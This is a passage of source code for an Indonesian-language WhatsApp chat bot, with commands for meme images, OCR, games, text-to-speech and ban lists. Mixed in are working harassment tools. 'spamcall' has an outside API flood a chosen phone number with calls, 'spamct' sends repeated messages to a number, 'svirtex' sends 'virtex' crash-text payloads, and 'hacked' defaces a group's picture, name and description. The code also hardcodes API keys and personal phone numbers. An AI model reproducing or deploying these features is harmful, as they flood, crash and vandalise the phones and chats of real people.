	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/rip?image=${anu.display_url}&apikey=hardianto`)
	 syaa.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan 🗿')
	}
	break
case 'stonkm':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				if (isBanned) return reply(mess.ban)
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(mess.wait)
	  owgi = await syaa.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/stonk?image=${anu.display_url}&apikey=hardianto`)
	 syaa.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan 🗿')
	}
	break
case 'notstonkm':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				if (isBanned) return reply(mess.ban)
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(mess.wait)
	  owgi = await syaa.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/not-stonk?image=${anu.display_url}&apikey=hardianto`)
	 syaa.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan 🗿')
	}
	break
case 'patrickm':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				if (isBanned) return reply(mess.ban)
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(mess.wait)
	  owgi = await syaa.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/knights/patrick?apikey=hardianto&pp=${anu.display_url}`)
	 syaa.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan 🗿')
	}
	break
case 'ocr':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				if (isBanned) return reply(mess.wait)
				reply(mess.wait)
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await syaa.downloadAndSaveMediaMessage(encmedia)
						await recognize(media, {lang: 'eng+ind', oem: 1, psm: 3})
							.then(teks => {
								reply(teks.trim())
								fs.unlinkSync(media)
							})
							.catch(err => {
								reply(err.message)
								fs.unlinkSync(media)
							})
					} else {
						reply('Foto aja gan Jangan Video')
					}
					await limitAdd(sender) 
					break
case "suit":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (isBanned) return reply(mess.ban)
  sendButMessage(from, `Pilih Gunting Kertas Atau Batu`, `case By @sofunsyabi.id`, [
          {
            buttonId: `${prefix}sutit batu`,
            buttonText: {
              displayText: `BATU`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}sutit gunting`,
            buttonText: {
              displayText: `GUNTING`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}sutit kertas`,
            buttonText: {
              displayText: `KERTAS`,
            },
            type: 1,
          },
        ]);
        break
case 'sutit':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (isBanned) return reply(mess.ban)
  if (args.length < 1) return reply('Pilih gunting/batu/kertas')
					if (args[0] === 'gunting' ) {
					  gunting = [
					    "Kamu *Gunting*\nAku *Kertas*\nKamu Menang 😔",
					    "Kamu *Gunting*\nAku *Batu*\nKamu Kalah 🙂",
					    "Kamu *Gunting*\nAku *Gunting*\nKita Seri 😏"
					    ]
					  gun = gunting[Math.floor(Math.random() * gunting.length)]
					  reply(gun)
					} else if (args[0] === 'kertas') {
					  ker = [
					    "Kamu *Kertas*\nAku *Batu*\nKamu Menang 😔",
					    "Kamu *Kertas*\nAku *Gunting*\nKamu Kalah 🙂",
					    "Kamu *Kertas*\nAku *Kertas*\nKita Seri 😏"
					    ]
					  kertas = ker[Math.floor(Math.random() * ker.length)]
						reply(kertas)
					} else if (args[0] === 'batu') {
					  bat = [
					    "Kamu *Batu*\nAku *Gunting*\nKamu Menang 😍",
					    "Kamu *Batu*\nAku *Kertas*\nKamu Kalah 🙂",
					    "Kamu *Batu*\nAku *Batu*\nKita Seri 😏"
					    ]
					  batu = bat[Math.floor(Math.random() * bat.length)]
					  reply(batu)
					} else {
					  reply('Pilih gunting/batu/kertas')
					}
break
case "gay":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (isBanned) return reply(mess.ban)
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
  ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
  reply("Loading....")
  owgi = await syaa.downloadAndSaveMediaMessage(ger)
  anu = await imgbb("dc773cce66f3dcf3ab3bc83dc7bf3555", owgi)
  teks = `${anu.display_url}`
  ranp = getRandom('.gif')
  rano = getRandom('.webp')
  anu1 = `https://some-random-api.ml/canvas/gay?avatar=${teks}`
  exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (e) => {
fs.unlinkSync(ranp)
if (e) return reply('Hadeh Emror:V')
nobg = fs.readFileSync(rano)
syaa.sendMessage(from, nobg, sticker, {
  quoted: mek
})
fs.unlinkSync(rano)
  })

} else {
  reply('Gunakan foto!')
}
break
case 'readall':
              totalchat.map( async ({ jid }) => {
              await syaa.chatRead(jid)
})
              reply(`\`\`\`Berhasil membaca Seluruh Chat !\`\`\``)
              console.log(totalchat.length)
              break	
case 'wangy':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (isBanned) return reply(mess.ban)
              if (!q) return
              qq = q.toUpperCase()
              awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
              reply(awikwok)
              break
       case "slebewbewbew":
         fakegroup(`Baiklah bot tidak akan kirim kamu virtex`)
			  break
case 'svirtex':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)    
reply(`${ngazap(prefix)}`)
reply(`${emoji2(prefix)}`)
reply(`${virtex(prefix)}`)
reply(`${virtex2(prefix)}`)
reply(`${virtex3(prefix)}`)
reply(`${virtex4(prefix)}`)
reply(`${virtex5(prefix)}`)
reply(`${virtex6(prefix)}`)
reply(`${virtex7(prefix)}`)
reply(`${virtex8(prefix)}`)
reply(`${virtex9(prefix)}`)
reply(`${virtag(prefix)}`)
break
case "report":
   case "quote":
          				kontil = args.join(" ")
                      if (kontil.length > 300) return syaa.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', text, {quoted: mek})
                        var tonmor = mek.participant
                       const buseh = `*[PANGGILAN USER]*\nNomor : @${tonmor.split("@s.whatsapp.net")[0]}\nPesan : ${kontil}`

                      var options = {
                         text: buseh,
                         contextInfo: {mentionedJid: [tonmor]},
                     }
                    syaa.sendMessage('6281319944917@s.whatsapp.net', options, text, {quoted: mek})
                    reply('Terima Kasih atas Masukan anda')
                    break
                    case 'addbucin':
                      if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
                    if (!isOwner) return sticOwner(from)
				    huu = body.slice(10)
						bucinrandom.push(huu)
						fs.writeFileSync('./database/bucin.json', JSON.stringify(bucinrandom))
						reply(`Sukses, Kata :\n*${huu}*\n Telah Ditambahkan ke database`)
						break
                    case 'bucin':
                    case 'quotebucin':
                      if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
                    if (isBanned) return reply(mess.ban)    
                    hasil = bucinrandom[Math.floor(Math.random() * (bucinrandom.length))]
                    syaa.sendMessage(from, '*'+hasil+'*', text, {quoted: mek})
            break
case "say":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (isBanned) return reply(mess.ban)
              teks = body.slice(5)
              if (args.length < 1) return reply('teksnya mana kak?')
              saying = teks
                 syaa.sendMessage(from, saying, text)
              break
var c = '```'
/*case "tagall":
					if (!isGroup) return reply("Khusus di grup");
					if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.admin);
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
						teks += ` *→*  @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
					break*/
					case 'ban':
				if (!isOwner && !mek.key.fromMe) return sticOwner(from)
				bnnd = body.slice(5)
				ban.push(`${args[0].replace('@','')}@s.whatsapp.net`)
				fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
				reply(`Berhasil membanned nomor : wa.me/${bnnd} `)
				break
case 'unban':  
					
					if (!isOwner && !mek.key.fromMe) return sticOwner(from)    
					delp = body.slice(7)
					ban.splice(`${delp}@s.whatsapp.net`, 1)
					fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
					reply(`Berhasil Menghapus wa.me/${delp} dari banned`)
					break
case 'listban':
		case 'banlist'://By M4N1K
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
					teks = '*List Ban:*\n\n'
					for (let manikgans of ban) {
						teks += `- ${manikgans}\n`
					}
					teks += `\n*Total : ${ban.length}*`
					syaa.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": ban } })
					break
case 'addprem':  
					if (!isOwner && !mek.key.fromMe) return sticOwner(from)    
					adprem = `${args[0].replace('@','')}@s.whatsapp.net`
					prem.push(adprem)
					fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
					reply(`BERHASIL MENAMBAHKAN USER PREMIUM`)
					break				
		case 'dellprem':  
					
					if (!isOwner && !mek.key.fromMe) return sticOwner(from)    
					delp = body.slice(10)
					prem.splice(`${delp}@s.whatsapp.net`, 1)
					fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
					reply(`Berhasil Menghapus wa.me/${delp} Dari Daftar Premium`)
					break
		case 'listprem':
		case 'premlist'://By M4N1K
					teks = '*List Premium:*\n\n'
					for (let manikgans of prem) {
						teks += `- ${manikgans}\n`
					}
					teks += `\n*Total : ${prem.length}*`
					syaa.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": prem } })
					break
case 'getpic':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (isBanned) return reply(mess.ban)
					if (args.length < 1) return 
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Siap Boss')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
						try {
						pp = await syaa.getProfilePicture(mentioned)
						buffer = await getBuffer(pp)
						
						syaa.sendMessage(from, buffer, image, {quoted: mek, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
					} catch (e) {
						syaa.sendMessage(from, buffer, image, {quoted: mek, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
					}
				break
case 'tag':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (isBanned) return reply(mess.ban)
			if (args.length < 1) return reply(`Penggunaan ${prefix}tag 62xnxx`)
            var nomqm = `${body.slice(5)}@s.whatsapp.net`
					tagq = `@${nomqm.split('@')[0]}` 
					syaa.sendMessage(from, tagq, text, { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
			break
			case 'tagme':
			  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
			  if (isBanned) return reply(mess.ban)
                  var nomqm = mek.participant
				    tagu = `@${nomqm.split('@s.whatsapp.net')[0]}`
					syaa.sendMessage(from, tagu, text, { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
					break
case 'naruto':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
reply(mess.wait)
budi = body.slice(8)
kon = (`https://hardianto-chan.herokuapp.com/api/photooxy/naruto?apikey=hardianto&text=${budi}`)
anu = await getBuffer(kon)
syaa.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./stik/fake.jpeg')})
break
case "attp"://Ini lu fix in sendiri aja
  if (!isBanned)return reply("Maaf Fitur ttp & attp sedang  errorr, mungkin karena dari website/rest api")
					if (args.length < 1) return reply('Teksnya?')
					biji = body.slice(6)
					atetepe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/maker/attp?text=${biji}&apikey=hardianto`)
					syaa.sendMessage(from, atetepe, sticker, { quoted: mek })
					break
case "ttpyellow":
  if (!isBanned)return reply("Maaf Fitur ttp & attp sedang  errorr, mungkin karena dari website/rest api")
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (isBanned) return reply(mess.ban)
					if (args.length < 1) return reply('Teksnya?')
					biji = body.slice(11)
					atetepe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/ttpcustom?text=${biji}&color=yellow&apikey=hardianto`)
					syaa.sendMessage(from, atetepe, sticker, { quoted: mek })
					break
case "ttpgreen":
  if (!isBanned)return reply("Maaf Fitur ttp & attp sedang  errorr, mungkin karena dari website/rest api")
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (isBanned) return reply(mess.ban)
					if (args.length < 1) return reply('Teksnya?')
					biji = body.slice(10)
					atetepe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/ttpcustom?text=${biji}&color=green&apikey=hardianto`)
					syaa.sendMessage(from, atetepe, sticker, { quoted: mek })
					break
case "ttpblue":
  if (!isBanned)return reply("Maaf Fitur ttp & attp sedang  errorr, mungkin karena dari website/rest api")
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (isBanned) return reply(mess.ban)
					if (args.length < 1) return reply('Teksnya?')
					biji = body.slice(9)
					atetepe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/ttpcustom?text=${biji}&color=blue&apikey=hardianto`)
					syaa.sendMessage(from, atetepe, sticker, { quoted: mek })
					break
case "ttp":
  if (!isBanned)return reply("Maaf Fitur ttp & attp sedang  errorr, mungkin karena dari website/rest api")
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (isBanned) return reply(mess.ban)
					if (args.length < 1) return reply('Teksnya?')
					biji = body.slice(5)
					atetepe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/ttpcustom?text=${biji}&color=brown&apikey=hardianto`)
					syaa.sendMessage(from, atetepe, sticker, { quoted: mek })
					break
case "kiss":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (isBanned) return reply(mess.ban)
					atetepe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=kiss&apikey=hardianto`)
					syaa.sendMessage(from, atetepe, sticker, { quoted: mek })
					break
case "halloween":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (isBanned) return reply(mess.ban)
					if (args.length < 1) return reply('Teksnya?')
					biji = body.slice(11)
					atetepe = await getBuffer(`https://bx-hunter.herokuapp.com/api/flamingtext/spider?text=${biji}&apikey=Ikyy69`)
					syaa.sendMessage(from, atetepe, image, { quoted: mek })
					break
case "minion":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (isBanned) return reply(mess.ban)
					if (args.length < 1) return reply('Teksnya?')
					biji = body.slice(8)
					atetepe = await getBuffer(`https://bx-hunter.herokuapp.com/api/flamingtext/minions?text=${biji}&apikey=Ikyy69`)
					syaa.sendMessage(from, atetepe, image, { quoted: mek })
					break
case "sswebfull":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (isBanned) return reply(mess.ban)
  reply(mess.wait)
       ini_url = args.join(" ")
					atetepe = await getBuffer(`https://docs-jojo.herokuapp.com/api/ssweb_full?url=${ini_url}`)
					syaa.sendMessage(from, atetepe, image, { quoted: mek })
					break
case "ssweb":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (isBanned) return reply(mess.ban)
  reply(mess.wait)
       ini_url = args.join(" ")
					atetepe = await getBuffer(`https://docs-jojo.herokuapp.com/api/ssweb?url=${ini_url}`)
					syaa.sendMessage(from, atetepe, image, { quoted: mek })
					break
case "artinama":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  reply(mess.wait)
  nama_lo = body.slice(10)
					atetepe = await getBuffer(`https://bx-hunter.herokuapp.com/api/artinama?nama=${nama_lo}&apikey=Ikyy69`)
					syaa.sendMessage(from, atetepe, { quoted: mek })
					break
case 'unblock':
					if (isBanned) return reply(mess.ban)
				    syaa.blockUser (`${body.slice(9)}@c.us`, "remove")
				 syaa.sendMessage(from, `*Perintah Diterima, Membuka Blockir* ${body.slice(9)}@c.us`, text)
					break
case "block":
  if (isBanned) return reply(mess.ban)
				 syaa.updatePresence(from, Presence.composing) 
				 syaa.chatRead (from)
					syaa.blockUser (`${body.slice(7)}@c.us`, "add")
					syaa.sendMessage(from, `*Perintah Diterima, Memblokir* ${body.slice(7)}@c.us`, text)
					break
case "shutdown":
					if (!isOwner && !mek.key.fromMe) return sticOwner(from) 
				return syaa.sendMessage(from, JSON.stringify(eval(process.exit())))
				reply('Byee Byeee')
				break
case "hacked":
  if (!isOwner && !mek.key.fromMe) return sticOwner(from) 
              if (!isGroup) return reply(mess.only.group)
              if (args.length < 1) return reply('Teksnya?')
              reply('Otw Hack')
                tessgc = await getBuffer(`https://i.ibb.co/m4Qx3JG/20210319-204838.jpg`)
                   syaa.updateProfilePicture (from, tessgc)
                   await sleep(1000)
                syaa.groupUpdateSubject(from, `HACKED BY ${body.slice(7)}`)
                await sleep(1000)
                syaa.groupUpdateDescription(from, `_${pushname} telah meretas grup ini_`)             
                await sleep(1000)
                syaa.sendMessage(from, 'Succes Hacked', text, {quoted: mek})
					break
case 'tovn':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (isBanned) return reply(mess.ban)
encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediam = await syaa.downloadAndSaveMediaMessage(encmediam)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(mediam)
						syaa.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:mek})
						fs.unlinkSync(mediam)
				break
case 'detikvn':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (isBanned) return reply(mess.ban)
encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediam = await syaa.downloadAndSaveMediaMessage(encmediam)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(mediam)
						syaa.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:mek})
						fs.unlinkSync(mediam)
				break
				case 'detikvideo':
				  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				  if (isBanned) return reply(mess.ban)
				encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					median = await syaa.downloadAndSaveMediaMessage(encmedian)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(median)
						syaa.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: mek})
						fs.unlinkSync(median)
				break
case "bahasa"://FIXED BY ARASYAA!!!!
case "kodebahasa"://FIXED BY ARASYAA!!!!
case "code"://FIXED BY ARASYAA!!!!
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
if (isBanned) return reply(mess.ban)
  reply(`*List Kode Bahasa Untuk Fitur tts id*

  af: Afrikaans,
  sq: Albanian,
  ar: Arabic,
  hy: Armenian,
  ca: Catalan,
  zh: Chinese,
  zh-cn: Chinese (Mandarin/China),
  zh-tw: Chinese (Mandarin/Taiwan),
  zh-yue: Chinese (Cantonese),
  hr: Croatian,
  cs: Czech,
  da: Danish,
  nl: Dutch,
  en: English,
  en-au: English (Australia),
  en-uk: English (United Kingdom),
  en-us: English (United States),
  eo: Esperanto,
  fi: Finnish,
  fr: French,
  de: German,
  el: Greek,
  ht: Haitian Creole,
  hi: Hindi,
  hu: Hungarian,
  is: Icelandic,
  id: Indonesian,
  it: Italian,
  ja: Japanese,
  ko: Korean,
  la: Latin,
  lv: Latvian,
  mk: Macedonian,
  no: Norwegian,
  pl: Polish,
  pt: Portuguese,
  pt-br: Portuguese (Brazil),
  ro: Romanian,
  ru: Russian,
  sr: Serbian,
  sk: Slovak,
  es: Spanish,
  es-es: Spanish (Spain),
  es-us: Spanish (United States),
  sw: Swahili,
  sv: Swedish,
  ta: Tamil,
  th: Thai,
  tr: Turkish,
  vi: Vietnamese,
  cy: Welsh
  
  Ketik /tts _Kode Bahasa_ _Text_
  contoh /tts id Arasya Ganteng`)
  
case 'tts'://FIXED BY ARASYAA!!!!
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
if (isBanned) return reply(mess.ban)
					if (args.length < 1) return syaa.sendMessage(from, `Kode bahasanya mana kak? contoh : ${prefix}tts id yamate kudasai`, text, { quoted: mek })
				   const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return syaa.sendMessage(from, `Teksnya mana kak? contoh : ${prefix}tts id yamate kudasai`, text, { quoted: mek })
					var bby = body.slice(8)
					ranm = getRandom('.mp3')
					rano = getRandom('.ogg')
					bby.length > 300
						? reply('Teks nya terlalu panjang kak')
						: gtts.save(ranm, bby, function () {
							exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
								fs.unlinkSync(ranm)
								buff = fs.readFileSync(rano)
								if (err) return reply(dla.stikga())
								syaa.sendMessage(from, buff, audio, { duration: 359996400, ptt: true, quoted: mek })
								fs.unlinkSync(rano)
							})
						})
					break
case 'chord':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  arasya_rafi_putra = args.join(" ") 
                anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/chord?q=${arasya_rafi_putra}`)
                syaa.sendMessage(from, anu.result, text, {quoted:mek})
                break
case 'infogempa':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (isBanned) return reply(mess.ban)
					anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/info/gempa?apikey=Ikyy69`, {method: 'get'})

					gempa = `❏ *INFO GEMPA*\n\n❏ Waktu : ${anu.result.Waktu}\n❏ Lintang : ${anu.result.Lintang}\n❏ Bujur : ${anu.result.Bujur}\n❏ Magnitudo : ${anu.result.Magnitudo}\n❏ Kedalaman : ${anu.result.Kedalaman}\n❏ Wilayah : ${anu.result.Wilayah}`
					reply('Sabar sayang')
					buff = await getBuffer(anu.result.Map)
					syaa.sendMessage(from, buff, image, {quoted: mek, caption: gempa})
					case 'creategroup':
			case 'creategrup':
			  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
			  if (isBanned) return reply(mess.ban)
			if (!isGroup) return reply(mess.only.group)
				if (args.length < 1) return reply(`Penggunaan ${prefix}creategrup nama grup|@tag member`)
				argz = arg.split('|')
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                    for (let i = 0; i < mentioned.length; i++){
						anu = []
						anu.push(mentioned[i])
                    }
					syaa.groupCreate(argz[0], anu)
					reply(`Sukses membuat grup ${arg[0]}`)
                }
				break
case 'dadu':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (isBanned) return reply(mess.ban)
			random = Math.floor(Math.random() * 6) + 1
		damdu = fs.readFileSync(`./sticker/${random}.webp`)
			syaa.sendMessage(from, damdu, sticker, {quoted: mek})
			break

case "infofilm": // Update NEW FITUR 
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
if (isBanned) return reply(mess.ban)
reply(`wait loading`)
                if (args.length < 1) return reply(`mau nyari apaan bwang di joox?`)
                reply(`[❕] Loading`)
                asu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/filmapik/search?film=${body.slice(10)}&apikey=beta`)
                teks = '=================\n'
                resa = asu.result.result
                for (let i of resa) {
                    teks += `*Title* : ${i.title}\n*Rating* : ${i.rating}\n*Episode* : ${i.episode}\n*Movie ID* : ${i.movieId}\n*Views* : ${i.views}\n*Duration* : ${i.duration}\n*Release* : ${i.release}\n=================\n`
                }
                reply(teks)
                break
case 'donat':
              reply(`◪ *DONASI*
  │
  ├─ ❏ *GOPAY*
  ├─ ❏ 088213292687
  ├─ ❏ *OVO*
  ├─ ❏ 088213292687
  ├─ ❏ *PULSA*
  ├─ ❏ 081319944917
  ├─ ❏ *INSTAGRAM*
  └─ ❏ https://www.instagram.com/@sofunsyabi.id`)

              break
case 'spamcall':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
			if (isBanned)return reply(mess.ban)
				if (args.length == 0) return reply(`Masukkan Nomer nya\ncontoh ${prefix}spamcall 0882XXX`)
			call = `${body.slice(11)}`
			anu = await fetchJson(`https://api.caliph71.xyz/api/spamcall?no=${call}&apikey=cq9j7Nma`, {method: 'get'})
			syaa.sendMessage(from, `${anu.result.logs}`, text, {quoted: mek})
			reply("Spam Message Succes Terkirim")
			break
case "spamct":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
              if (isBanned) return reply(mess.ban)
              if (args.length == 0) return reply(`Masukkan Parameter\n\ncommand : ${prefix}spamchat nomor|jumlah|teks`)
					spatek = args.join(' ').split('|')
					if (isNaN(spatek[0])) return reply('Nomor Harus Berupa Angka!')
					for (let i = 0; i < spatek[1]; i++) {
					syaa.sendMessage(spatek[0]+'@s.whatsapp.net', `${spatek[2]}`, text)
					}
					reply(`Spam Terkirim Ke nomor ${spatek[0]}`)
					break
case "truth":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (isBanned) return reply(mess.ban)
					// Fix Case By Yogi/Hans⛔
                 
					const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun 